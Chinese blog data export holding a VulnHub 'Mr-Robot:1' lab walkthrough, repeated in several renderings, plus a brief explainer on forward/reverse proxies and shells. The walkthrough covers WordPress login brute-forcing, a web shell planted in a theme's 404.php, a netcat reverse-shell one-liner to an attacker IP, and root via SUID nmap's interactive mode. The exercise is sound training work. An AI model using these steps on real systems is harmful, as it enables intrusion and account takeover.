id=\"正向代理和反向代理的区别\"><a href=\"#正向代理和反向代理的区别\" class=\"headerlink\" title=\"正向代理和反向代理的区别\"></a>正向代理和反向代理的区别</h3><p>正向代理，当客户端无法访问外部资源的时候（比如Google、YouTube），可以通过一个正向代理去间接地访问。</p>\n<p>正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。</p>\n<p>反向代理，客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。此时代理服务器对外就表现为一个服务器</p>\n<h4 id=\"正向SHELL和反向SHELL的区别\"><a href=\"#正向SHELL和反向SHELL的区别\" class=\"headerlink\" title=\"正向SHELL和反向SHELL的区别\"></a>正向SHELL和反向SHELL的区别</h4><p>正向Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。</p>\n<p>反向Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。</p>\n<blockquote>\n<p><strong>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端.</strong></p>\n<p><strong>反向代理即是服务端代理, 代理服务端, 客户端不知道实际提供服务的服务端</strong></p>\n</blockquote>\n"},{"title":"VulnHub | Mr-Robot:1","date":"2021-12-04T07:52:34.000Z","cover":"https://img.freeaes.com/images/2021/09/05/4.jpg","_content":"\n# Mr.Robot\n最近在看黑客军团（Mr.Robot），其实说实话我觉得这片还是有点像心理犯罪片，以前看的时候有点看不懂在干啥（也可能智商问题），在逛vulnhub的时候又刚好看到有个以这个命名的靶机，就下载下来玩玩了。\n## 项目地址\n[http://www.vulnhub.com/entry/mr-robot-1,151/](http://www.vulnhub.com/entry/mr-robot-1,151/)\n难度：Low-Medium\n## 测试环境\n攻击机:Parrot 192.168.56.15 (host-only)\n目标靶机:Ubuntu 192.168.56.102 (host-only)\n\n\n## 信息收集\n首先，打开大鹦鹉。使用arp扫描查找目标IP.`arp-scan -I eth1 -l`，使用 `-I/--interface`参数指定网络适配器，逐个查找目标计算机。\n![0](https://img.freeaes.com/images/2021/12/03/0.png)\n![1](https://img.freeaes.com/images/2021/12/03/1.png)\n扫描目标以查看哪些端口打开。`nmap -sS -p- -n 192.168.56.102`\n-sS 使用TCP SYN连接扫描。\n-p- 扫描全端口\n-n 不进行DNS域名解析\n扫描后，你可以看到目标开启了80、443端口，22端口显示关闭。在浏览器访问目标网站服务器\n![2](https://img.freeaes.com/images/2021/12/03/2.png)\n浏览器访问界面看起来像是个Bash，输入几个常用命令，均显示错误，输入`help`命令后，会弹出几个可用的自定义命令，应该只是一个php或静态页面，尝试了一下，没有可以利用的点。\n![3](https://img.freeaes.com/images/2021/12/03/3.png)\n在访问robots.txt文件时，发现两个敏感文件（fsocity.dic和key-1-of-3.txt）。访问key-1-of-3.txt文件获取到第一个Key。`fsocity.dic`看起来像一个字典文件,先保存下来.\n![4](https://img.freeaes.com/images/2021/12/03/4.png)\n![5](https://img.freeaes.com/images/2021/12/03/5.png)\n![6](https://img.freeaes.com/images/2021/12/03/6.png)\n\n在目录遍历的过程中，我找到一个登录页，访问它，是一个WordPress程序，访问`wp-admin`路径并找到后台登录页。但我没有帐户密码。考虑到先前下载的`fsocity.dic`是一个字典文件，我可以用其进行暴力破解。\n![7](https://img.freeaes.com/images/2021/12/03/7.png)\n![8](https://img.freeaes.com/images/2021/12/03/8.png)\n\n## 暴力破解\n在进行爆破前，我需要知道用户名是什么，我测试了几个常用的用户名，但均显示用户不存在，我觉得用户名应该也存在于刚才的字典内。然后添加变量为`user_login`参数。\n首先打开BurpSuite并抓取数据包，将捕获的请求数据包发送到入侵模块。按清除按钮清除默认选择的变量。\n![9](https://img.freeaes.com/images/2021/12/03/9.png)\n但我发现先前保存的字典有7点多mb大小。我想可能需要清除一些重复的字段。使用'cat fsocity.dic | sort-u>fsocity'命令将重复的检查结果保存到文件fsocity，以看到，执行后的文件大小仅为95k。在Burp中导入字典。根据设备配置设置`resource pool`，然后start attack。\n![10](https://img.freeaes.com/images/2021/12/03/10.png)\n![11](https://img.freeaes.com/images/2021/12/03/11.png)\n![11](https://img.freeaes.com/images/2021/12/03/12.png)\n破解后有三个用户名返回的包大小与其他包不一致，查看返回包，可以发现用户名存在，但无法向邮箱发送电子邮件（可能是配置问题），但并不妨碍我们进行下一步行动。\n![13](https://img.freeaes.com/images/2021/12/03/13.png)\n\n找到用户名，下一步是爆破密码。返回登录页面并获取包含登录信息的数据包。同样，将其发送到Intrude模块并清除默认变量。这一次，您需要添加两个变量`log`和`pwd`（因为要破解的用户名不是唯一的），并将攻击类型设置为Cluster bomb。将三个刚刚破解的用户名添加到payload1，并将fsocity.dic字典加载到payload2。设置resource pool后，start attack。\n![14](https://img.freeaes.com/images/2021/12/03/14.png)\n![15](https://img.freeaes.com/images/2021/12/03/15.png)\n![16](https://img.freeaes.com/images/2021/12/03/16.png)\n![17](https://img.freeaes.com/images/2021/12/03/17.png)\n![18](https://img.freeaes.com/images/2021/12/03/18.png)\n\n## 上传Web Shell\n暴力破解后，会得到三组用户名和密码（elliot/ER28-0652、elliot/ER28-0652、elliot/ER28-0652）。三组密码都可以成功登录。使用其中一个登录到管理面板。\n![19](https://img.freeaes.com/images/2021/12/03/19.png)\n![20](https://img.freeaes.com/images/2021/12/03/20.png)\n\n一般WordPress可以在appearance的editor子项中编辑PHP文件。我们可以通过修改404.php来写入WebShell。然后使用AntSwarm连接到WebShell(http://192.168.56.102/wp-content/themes/twentyfifteen/404.php)\n![21](https://img.freeaes.com/images/2021/12/03/21.png)\n![22](https://img.freeaes.com/images/2021/12/03/22.png)\n![23](https://img.freeaes.com/images/2021/12/03/23.png)\n\n在查看网站根目录中的文件时发现了三个可疑文件（License.txt、License.bk、you-will-never-guess-this-file-name.txt）。`License`本身并不可疑，但我不知道它为什么需要备份。\n![24](https://img.freeaes.com/images/2021/12/03/24.png)\n通过检查文件内容，可以发现`license.bk`和`you will event this file name.txt`并没有什么问题，但文件`license.txt`中有一串经过Base64加密的密文。\n![25](https://img.freeaes.com/images/2021/12/03/25.png)\n\n通过使用工具解密，可以看出它只是刚刚爆破出来的WordPress网站的后台账号密码。\n![26](https://img.freeaes.com/images/2021/12/03/26.png)\n\n在查看用户的家目录时，我在robot用户的家目录中发现了两个文件。查看第一个文件时，系统将提示您权限不足。使用`ls`命令查看文件的所有者为robot，`Key-2-of-3.txt`只能由robot或root读取，但幸运的是，可以查看第二个文件。\n![27](https://img.freeaes.com/images/2021/12/03/27.png)\n![28](https://img.freeaes.com/images/2021/12/03/28.png)\n\n查看`password.raw-md5`文件,返回一段字符串。判断它是一串MD5密文。通过网站解密，解密后的密文是`robot/abcdefghijklmnopqrstuvwxyz`，这应该是robot用户的帐户密码（解密时，我使用的第一个网站是`cmd5.com`，但我发现它居然需要付费才能查看。然后我使用了`somd5.com`，幸运的是，它比较良心，并没有向我收费）。\n![29](https://img.freeaes.com/images/2021/12/03/29.png)\n![30](https://img.freeaes.com/images/2021/12/03/30.png)\n![31](https://img.freeaes.com/images/2021/12/03/31.png)\n\n## 生成TTY Shell\n现在已经拥有了robot的用户名和密码，可以直接登录到robot用户查看第二个key。但是，在webshell中直接使用`su`命令将返回错误，并且在先前扫描端口时并没有发现目标开启SSH或Telnet服务。所以我需要先创建一个反弹shell。\n![32](https://img.freeaes.com/images/2021/12/03/32.png)\n在执行过程中，我尝试了几种方法，但都没有成功反弹。最后，我使用了`rm/tmp/f;mkfifo/tmp/f;cat/tmp/f | /bin/bash-i 2>&1 | nc 192.168.56.104 8848>/tmp/f`命令成功执行。在执行该命令之前，您需要在攻击机打开一个终端并输入`nc-lvvp 8848`命令侦听来自目标机器的连接。\n![33](https://img.freeaes.com/images/2021/12/04/33.jpg)\n![34](https://img.freeaes.com/images/2021/12/03/34.png)\n\n要切换到robot用户，我需要生成一个TTY会话，并使用`python -c 'import pty;pty.spawn(\"/bin/bash\")'`命令生成TTY Shell。然后使用刚刚解密的密码通过`su`命令切换用户，并查看robot家目录下的第二个密钥。\n![35](https://img.freeaes.com/images/2021/12/03/35.png)\n\n## 提权\n\n剩下最后一个key，使用`find / -name key-*.txt 2>/dev/null`命令扫描整个系统。但是，由于权限不足，甚至找不到第一个key，考虑提权。\n![36](https://img.freeaes.com/images/2021/12/03/36.png)\n\n使用`find / -perm -04000 2>/dev/null`命令在系统中查找具有`suid`权限的文件列表。找到`nmap`命令并查看其版本信息。5.2.0版之前的Nmap具有交互功能，可用于提权。幸运的是，这个版本是3.8.1，符合版本。\n![37](https://img.freeaes.com/images/2021/12/03/37.png)\n![38](https://img.freeaes.com/images/2021/12/03/38.png)\n\n执行`nmap --interactive`命令进入交互模式并输入`!sh`打开了一个shell。当检查用户的身份时，可以发现它正在以root用户身份运行。\n![39](https://img.freeaes.com/images/2021/12/03/39.png)\n\n再次查找，在root目录中找到第三个key。直接查看该文件。\n![40](https://img.freeaes.com/images/2021/12/03/40.png)\n## Game Over\n","source":"_posts/2021-12-04.md","raw":"---\ntitle: VulnHub | Mr-Robot:1\ndate: 2021-12-04 15:52:34\ncover: https://img.freeaes.com/images/2021/09/05/4.jpg\ntags:\n- VulnHub\n- Web 安全\ncategories: 学习笔记\n---\n\n# Mr.Robot\n最近在看黑客军团（Mr.Robot），其实说实话我觉得这片还是有点像心理犯罪片，以前看的时候有点看不懂在干啥（也可能智商问题），在逛vulnhub的时候又刚好看到有个以这个命名的靶机，就下载下来玩玩了。\n## 项目地址\n[http://www.vulnhub.com/entry/mr-robot-1,151/](http://www.vulnhub.com/entry/mr-robot-1,151/)\n难度：Low-Medium\n## 测试环境\n攻击机:Parrot 192.168.56.15 (host-only)\n目标靶机:Ubuntu 192.168.56.102 (host-only)\n\n\n## 信息收集\n首先，打开大鹦鹉。使用arp扫描查找目标IP.`arp-scan -I eth1 -l`，使用 `-I/--interface`参数指定网络适配器，逐个查找目标计算机。\n![0](https://img.freeaes.com/images/2021/12/03/0.png)\n![1](https://img.freeaes.com/images/2021/12/03/1.png)\n扫描目标以查看哪些端口打开。`nmap -sS -p- -n 192.168.56.102`\n-sS 使用TCP SYN连接扫描。\n-p- 扫描全端口\n-n 不进行DNS域名解析\n扫描后，你可以看到目标开启了80、443端口，22端口显示关闭。在浏览器访问目标网站服务器\n![2](https://img.freeaes.com/images/2021/12/03/2.png)\n浏览器访问界面看起来像是个Bash，输入几个常用命令，均显示错误，输入`help`命令后，会弹出几个可用的自定义命令，应该只是一个php或静态页面，尝试了一下，没有可以利用的点。\n![3](https://img.freeaes.com/images/2021/12/03/3.png)\n在访问robots.txt文件时，发现两个敏感文件（fsocity.dic和key-1-of-3.txt）。访问key-1-of-3.txt文件获取到第一个Key。`fsocity.dic`看起来像一个字典文件,先保存下来.\n![4](https://img.freeaes.com/images/2021/12/03/4.png)\n![5](https://img.freeaes.com/images/2021/12/03/5.png)\n![6](https://img.freeaes.com/images/2021/12/03/6.png)\n\n在目录遍历的过程中，我找到一个登录页，访问它，是一个WordPress程序，访问`wp-admin`路径并找到后台登录页。但我没有帐户密码。考虑到先前下载的`fsocity.dic`是一个字典文件，我可以用其进行暴力破解。\n![7](https://img.freeaes.com/images/2021/12/03/7.png)\n![8](https://img.freeaes.com/images/2021/12/03/8.png)\n\n## 暴力破解\n在进行爆破前，我需要知道用户名是什么，我测试了几个常用的用户名，但均显示用户不存在，我觉得用户名应该也存在于刚才的字典内。然后添加变量为`user_login`参数。\n首先打开BurpSuite并抓取数据包，将捕获的请求数据包发送到入侵模块。按清除按钮清除默认选择的变量。\n![9](https://img.freeaes.com/images/2021/12/03/9.png)\n但我发现先前保存的字典有7点多mb大小。我想可能需要清除一些重复的字段。使用'cat fsocity.dic | sort-u>fsocity'命令将重复的检查结果保存到文件fsocity，以看到，执行后的文件大小仅为95k。在Burp中导入字典。根据设备配置设置`resource pool`，然后start attack。\n![10](https://img.freeaes.com/images/2021/12/03/10.png)\n![11](https://img.freeaes.com/images/2021/12/03/11.png)\n![11](https://img.freeaes.com/images/2021/12/03/12.png)\n破解后有三个用户名返回的包大小与其他包不一致，查看返回包，可以发现用户名存在，但无法向邮箱发送电子邮件（可能是配置问题），但并不妨碍我们进行下一步行动。\n![13](https://img.freeaes.com/images/2021/12/03/13.png)\n\n找到用户名，下一步是爆破密码。返回登录页面并获取包含登录信息的数据包。同样，将其发送到Intrude模块并清除默认变量。这一次，您需要添加两个变量`log`和`pwd`（因为要破解的用户名不是唯一的），并将攻击类型设置为Cluster bomb。将三个刚刚破解的用户名添加到payload1，并将fsocity.dic字典加载到payload2。设置resource pool后，start attack。\n![14](https://img.freeaes.com/images/2021/12/03/14.png)\n![15](https://img.freeaes.com/images/2021/12/03/15.png)\n![16](https://img.freeaes.com/images/2021/12/03/16.png)\n![17](https://img.freeaes.com/images/2021/12/03/17.png)\n![18](https://img.freeaes.com/images/2021/12/03/18.png)\n\n## 上传Web Shell\n暴力破解后，会得到三组用户名和密码（elliot/ER28-0652、elliot/ER28-0652、elliot/ER28-0652）。三组密码都可以成功登录。使用其中一个登录到管理面板。\n![19](https://img.freeaes.com/images/2021/12/03/19.png)\n![20](https://img.freeaes.com/images/2021/12/03/20.png)\n\n一般WordPress可以在appearance的editor子项中编辑PHP文件。我们可以通过修改404.php来写入WebShell。然后使用AntSwarm连接到WebShell(http://192.168.56.102/wp-content/themes/twentyfifteen/404.php)\n![21](https://img.freeaes.com/images/2021/12/03/21.png)\n![22](https://img.freeaes.com/images/2021/12/03/22.png)\n![23](https://img.freeaes.com/images/2021/12/03/23.png)\n\n在查看网站根目录中的文件时发现了三个可疑文件（License.txt、License.bk、you-will-never-guess-this-file-name.txt）。`License`本身并不可疑，但我不知道它为什么需要备份。\n![24](https://img.freeaes.com/images/2021/12/03/24.png)\n通过检查文件内容，可以发现`license.bk`和`you will event this file name.txt`并没有什么问题，但文件`license.txt`中有一串经过Base64加密的密文。\n![25](https://img.freeaes.com/images/2021/12/03/25.png)\n\n通过使用工具解密，可以看出它只是刚刚爆破出来的WordPress网站的后台账号密码。\n![26](https://img.freeaes.com/images/2021/12/03/26.png)\n\n在查看用户的家目录时，我在robot用户的家目录中发现了两个文件。查看第一个文件时，系统将提示您权限不足。使用`ls`命令查看文件的所有者为robot，`Key-2-of-3.txt`只能由robot或root读取，但幸运的是，可以查看第二个文件。\n![27](https://img.freeaes.com/images/2021/12/03/27.png)\n![28](https://img.freeaes.com/images/2021/12/03/28.png)\n\n查看`password.raw-md5`文件,返回一段字符串。判断它是一串MD5密文。通过网站解密，解密后的密文是`robot/abcdefghijklmnopqrstuvwxyz`，这应该是robot用户的帐户密码（解密时，我使用的第一个网站是`cmd5.com`，但我发现它居然需要付费才能查看。然后我使用了`somd5.com`，幸运的是，它比较良心，并没有向我收费）。\n![29](https://img.freeaes.com/images/2021/12/03/29.png)\n![30](https://img.freeaes.com/images/2021/12/03/30.png)\n![31](https://img.freeaes.com/images/2021/12/03/31.png)\n\n## 生成TTY Shell\n现在已经拥有了robot的用户名和密码，可以直接登录到robot用户查看第二个key。但是，在webshell中直接使用`su`命令将返回错误，并且在先前扫描端口时并没有发现目标开启SSH或Telnet服务。所以我需要先创建一个反弹shell。\n![32](https://img.freeaes.com/images/2021/12/03/32.png)\n在执行过程中，我尝试了几种方法，但都没有成功反弹。最后，我使用了`rm/tmp/f;mkfifo/tmp/f;cat/tmp/f | /bin/bash-i 2>&1 | nc 192.168.56.104 8848>/tmp/f`命令成功执行。在执行该命令之前，您需要在攻击机打开一个终端并输入`nc-lvvp 8848`命令侦听来自目标机器的连接。\n![33](https://img.freeaes.com/images/2021/12/04/33.jpg)\n![34](https://img.freeaes.com/images/2021/12/03/34.png)\n\n要切换到robot用户，我需要生成一个TTY会话，并使用`python -c 'import pty;pty.spawn(\"/bin/bash\")'`命令生成TTY Shell。然后使用刚刚解密的密码通过`su`命令切换用户，并查看robot家目录下的第二个密钥。\n![35](https://img.freeaes.com/images/2021/12/03/35.png)\n\n## 提权\n\n剩下最后一个key，使用`find / -name key-*.txt 2>/dev/null`命令扫描整个系统。但是，由于权限不足，甚至找不到第一个key，考虑提权。\n![36](https://img.freeaes.com/images/2021/12/03/36.png)\n\n使用`find / -perm -04000 2>/dev/null`命令在系统中查找具有`suid`权限的文件列表。找到`nmap`命令并查看其版本信息。5.2.0版之前的Nmap具有交互功能，可用于提权。幸运的是，这个版本是3.8.1，符合版本。\n![37](https://img.freeaes.com/images/2021/12/03/37.png)\n![38](https://img.freeaes.com/images/2021/12/03/38.png)\n\n执行`nmap --interactive`命令进入交互模式并输入`!sh`打开了一个shell。当检查用户的身份时，可以发现它正在以root用户身份运行。\n![39](https://img.freeaes.com/images/2021/12/03/39.png)\n\n再次查找，在root目录中找到第三个key。直接查看该文件。\n![40](https://img.freeaes.com/images/2021/12/03/40.png)\n## Game Over\n","slug":"2021-12-04","published":1,"updated":"2022-01-13T08:04:37.541Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsvihq0003uxf76qa3c8ci","content":"<h1 id=\"Mr-Robot\"><a href=\"#Mr-Robot\" class=\"headerlink\" title=\"Mr.Robot\"></a>Mr.Robot</h1><p>最近在看黑客军团（Mr.Robot），其实说实话我觉得这片还是有点像心理犯罪片，以前看的时候有点看不懂在干啥（也可能智商问题），在逛vulnhub的时候又刚好看到有个以这个命名的靶机，就下载下来玩玩了。</p>\n<h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/mr-robot-1,151/\">http://www.vulnhub.com/entry/mr-robot-1,151/</a><br>难度：Low-Medium</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机:Parrot 192.168.56.15 (host-only)<br>目标靶机:Ubuntu 192.168.56.102 (host-only)</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>首先，打开大鹦鹉。使用arp扫描查找目标IP.<code>arp-scan -I eth1 -l</code>，使用 <code>-I/--interface</code>参数指定网络适配器，逐个查找目标计算机。<br><img src=\"https://img.freeaes.com/images/2021/12/03/0.png\" alt=\"0\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/1.png\" alt=\"1\"><br>扫描目标以查看哪些端口打开。<code>nmap -sS -p- -n 192.168.56.102</code><br>-sS 使用TCP SYN连接扫描。<br>-p- 扫描全端口<br>-n 不进行DNS域名解析<br>扫描后，你可以看到目标开启了80、443端口，22端口显示关闭。在浏览器访问目标网站服务器<br><img src=\"https://img.freeaes.com/images/2021/12/03/2.png\" alt=\"2\"><br>浏览器访问界面看起来像是个Bash，输入几个常用命令，均显示错误，输入<code>help</code>命令后，会弹出几个可用的自定义命令，应该只是一个php或静态页面，尝试了一下，没有可以利用的点。<br><img src=\"https://img.freeaes.com/images/2021/12/03/3.png\" alt=\"3\"><br>在访问robots.txt文件时，发现两个敏感文件（fsocity.dic和key-1-of-3.txt）。访问key-1-of-3.txt文件获取到第一个Key。<code>fsocity.dic</code>看起来像一个字典文件,先保存下来.<br><img src=\"https://img.freeaes.com/images/2021/12/03/4.png\" alt=\"4\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/5.png\" alt=\"5\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/6.png\" alt=\"6\"></p>\n<p>在目录遍历的过程中，我找到一个登录页，访问它，是一个WordPress程序，访问<code>wp-admin</code>路径并找到后台登录页。但我没有帐户密码。考虑到先前下载的<code>fsocity.dic</code>是一个字典文件，我可以用其进行暴力破解。<br><img src=\"https://img.freeaes.com/images/2021/12/03/7.png\" alt=\"7\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/8.png\" alt=\"8\"></p>\n<h2 id=\"暴力破解\"><a href=\"#暴力破解\" class=\"headerlink\" title=\"暴力破解\"></a>暴力破解</h2><p>在进行爆破前，我需要知道用户名是什么，我测试了几个常用的用户名，但均显示用户不存在，我觉得用户名应该也存在于刚才的字典内。然后添加变量为<code>user_login</code>参数。<br>首先打开BurpSuite并抓取数据包，将捕获的请求数据包发送到入侵模块。按清除按钮清除默认选择的变量。<br><img src=\"https://img.freeaes.com/images/2021/12/03/9.png\" alt=\"9\"><br>但我发现先前保存的字典有7点多mb大小。我想可能需要清除一些重复的字段。使用’cat fsocity.dic | sort-u&gt;fsocity’命令将重复的检查结果保存到文件fsocity，以看到，执行后的文件大小仅为95k。在Burp中导入字典。根据设备配置设置<code>resource pool</code>，然后start attack。<br><img src=\"https://img.freeaes.com/images/2021/12/03/10.png\" alt=\"10\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/11.png\" alt=\"11\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/12.png\" alt=\"11\"><br>破解后有三个用户名返回的包大小与其他包不一致，查看返回包，可以发现用户名存在，但无法向邮箱发送电子邮件（可能是配置问题），但并不妨碍我们进行下一步行动。<br><img src=\"https://img.freeaes.com/images/2021/12/03/13.png\" alt=\"13\"></p>\n<p>找到用户名，下一步是爆破密码。返回登录页面并获取包含登录信息的数据包。同样，将其发送到Intrude模块并清除默认变量。这一次，您需要添加两个变量<code>log</code>和<code>pwd</code>（因为要破解的用户名不是唯一的），并将攻击类型设置为Cluster bomb。将三个刚刚破解的用户名添加到payload1，并将fsocity.dic字典加载到payload2。设置resource pool后，start attack。<br><img src=\"https://img.freeaes.com/images/2021/12/03/14.png\" alt=\"14\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/15.png\" alt=\"15\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/16.png\" alt=\"16\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/17.png\" alt=\"17\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/18.png\" alt=\"18\"></p>\n<h2 id=\"上传Web-Shell\"><a href=\"#上传Web-Shell\" class=\"headerlink\" title=\"上传Web Shell\"></a>上传Web Shell</h2><p>暴力破解后，会得到三组用户名和密码（elliot/ER28-0652、elliot/ER28-0652、elliot/ER28-0652）。三组密码都可以成功登录。使用其中一个登录到管理面板。<br><img src=\"https://img.freeaes.com/images/2021/12/03/19.png\" alt=\"19\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/20.png\" alt=\"20\"></p>\n<p>一般WordPress可以在appearance的editor子项中编辑PHP文件。我们可以通过修改404.php来写入WebShell。然后使用AntSwarm连接到WebShell(<a href=\"http://192.168.56.102/wp-content/themes/twentyfifteen/404.php\">http://192.168.56.102/wp-content/themes/twentyfifteen/404.php</a>)<br><img src=\"https://img.freeaes.com/images/2021/12/03/21.png\" alt=\"21\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/22.png\" alt=\"22\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/23.png\" alt=\"23\"></p>\n<p>在查看网站根目录中的文件时发现了三个可疑文件（License.txt、License.bk、you-will-never-guess-this-file-name.txt）。<code>License</code>本身并不可疑，但我不知道它为什么需要备份。<br><img src=\"https://img.freeaes.com/images/2021/12/03/24.png\" alt=\"24\"><br>通过检查文件内容，可以发现<code>license.bk</code>和<code>you will event this file name.txt</code>并没有什么问题，但文件<code>license.txt</code>中有一串经过Base64加密的密文。<br><img src=\"https://img.freeaes.com/images/2021/12/03/25.png\" alt=\"25\"></p>\n<p>通过使用工具解密，可以看出它只是刚刚爆破出来的WordPress网站的后台账号密码。<br><img src=\"https://img.freeaes.com/images/2021/12/03/26.png\" alt=\"26\"></p>\n<p>在查看用户的家目录时，我在robot用户的家目录中发现了两个文件。查看第一个文件时，系统将提示您权限不足。使用<code>ls</code>命令查看文件的所有者为robot，<code>Key-2-of-3.txt</code>只能由robot或root读取，但幸运的是，可以查看第二个文件。<br><img src=\"https://img.freeaes.com/images/2021/12/03/27.png\" alt=\"27\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/28.png\" alt=\"28\"></p>\n<p>查看<code>password.raw-md5</code>文件,返回一段字符串。判断它是一串MD5密文。通过网站解密，解密后的密文是<code>robot/abcdefghijklmnopqrstuvwxyz</code>，这应该是robot用户的帐户密码（解密时，我使用的第一个网站是<code>cmd5.com</code>，但我发现它居然需要付费才能查看。然后我使用了<code>somd5.com</code>，幸运的是，它比较良心，并没有向我收费）。<br><img src=\"https://img.freeaes.com/images/2021/12/03/29.png\" alt=\"29\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/30.png\" alt=\"30\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/31.png\" alt=\"31\"></p>\n<h2 id=\"生成TTY-Shell\"><a href=\"#生成TTY-Shell\" class=\"headerlink\" title=\"生成TTY Shell\"></a>生成TTY Shell</h2><p>现在已经拥有了robot的用户名和密码，可以直接登录到robot用户查看第二个key。但是，在webshell中直接使用<code>su</code>命令将返回错误，并且在先前扫描端口时并没有发现目标开启SSH或Telnet服务。所以我需要先创建一个反弹shell。<br><img src=\"https://img.freeaes.com/images/2021/12/03/32.png\" alt=\"32\"><br>在执行过程中，我尝试了几种方法，但都没有成功反弹。最后，我使用了<code>rm/tmp/f;mkfifo/tmp/f;cat/tmp/f | /bin/bash-i 2&gt;&amp;1 | nc 192.168.56.104 8848&gt;/tmp/f</code>命令成功执行。在执行该命令之前，您需要在攻击机打开一个终端并输入<code>nc-lvvp 8848</code>命令侦听来自目标机器的连接。<br><img src=\"https://img.freeaes.com/images/2021/12/04/33.jpg\" alt=\"33\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/34.png\" alt=\"34\"></p>\n<p>要切换到robot用户，我需要生成一个TTY会话，并使用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>命令生成TTY Shell。然后使用刚刚解密的密码通过<code>su</code>命令切换用户，并查看robot家目录下的第二个密钥。<br><img src=\"https://img.freeaes.com/images/2021/12/03/35.png\" alt=\"35\"></p>\n<h2 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h2><p>剩下最后一个key，使用<code>find / -name key-*.txt 2&gt;/dev/null</code>命令扫描整个系统。但是，由于权限不足，甚至找不到第一个key，考虑提权。<br><img src=\"https://img.freeaes.com/images/2021/12/03/36.png\" alt=\"36\"></p>\n<p>使用<code>find / -perm -04000 2&gt;/dev/null</code>命令在系统中查找具有<code>suid</code>权限的文件列表。找到<code>nmap</code>命令并查看其版本信息。5.2.0版之前的Nmap具有交互功能，可用于提权。幸运的是，这个版本是3.8.1，符合版本。<br><img src=\"https://img.freeaes.com/images/2021/12/03/37.png\" alt=\"37\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/38.png\" alt=\"38\"></p>\n<p>执行<code>nmap --interactive</code>命令进入交互模式并输入<code>!sh</code>打开了一个shell。当检查用户的身份时，可以发现它正在以root用户身份运行。<br><img src=\"https://img.freeaes.com/images/2021/12/03/39.png\" alt=\"39\"></p>\n<p>再次查找，在root目录中找到第三个key。直接查看该文件。<br><img src=\"https://img.freeaes.com/images/2021/12/03/40.png\" alt=\"40\"></p>\n<h2 id=\"Game-Over\"><a href=\"#Game-Over\" class=\"headerlink\" title=\"Game Over\"></a>Game Over</h2>","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<h1 id=\"Mr-Robot\"><a href=\"#Mr-Robot\" class=\"headerlink\" title=\"Mr.Robot\"></a>Mr.Robot</h1><p>最近在看黑客军团（Mr.Robot），其实说实话我觉得这片还是有点像心理犯罪片，以前看的时候有点看不懂在干啥（也可能智商问题），在逛vulnhub的时候又刚好看到有个以这个命名的靶机，就下载下来玩玩了。</p>\n<h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/mr-robot-1,151/\">http://www.vulnhub.com/entry/mr-robot-1,151/</a><br>难度：Low-Medium</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机:Parrot 192.168.56.15 (host-only)<br>目标靶机:Ubuntu 192.168.56.102 (host-only)</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>首先，打开大鹦鹉。使用arp扫描查找目标IP.<code>arp-scan -I eth1 -l</code>，使用 <code>-I/--interface</code>参数指定网络适配器，逐个查找目标计算机。<br><img src=\"https://img.freeaes.com/images/2021/12/03/0.png\" alt=\"0\"><br><img src=\"https://img.freeaes.com/images/2021/12/03/1.png\" alt=\"1\"><br>扫描目标以查看哪些端口打开。<code>nmap -sS -p- -n 192.168.56.102</code><br>-sS 使用TCP SYN连接扫描。<br>-p- 扫描全端口<br>-n 不进行DNS域名解析<br>扫描后，你可以看到目标开启了80、443端口，22端口显示关闭。在浏览器访问目标网站服务器<br><img src=\"https://img.freeaes.com/images/2021/12/03/2.png\" alt=\"2\"><br>浏览器访问界面看起来像是个Bash，输入几个常用命令，均显示错误，输入<code>help</code>命令后，会弹出几个可用的自定义命令，应该只是一个php或静态页面，尝试了一下，没有可以利用的点。<br><img src=\"https://img.freeaes.com/images/2021/12/03/3.png\" alt=\"3\"><br>在访问robots.txt文件时，发现两个敏感文件（fsocity.dic和key-1-of-3.txt）。访问key-1-of-3.txt文件获取到第一个Key。<code>fsocity.dic</code>看起来像一个字典文件,先保存下来.<br><img 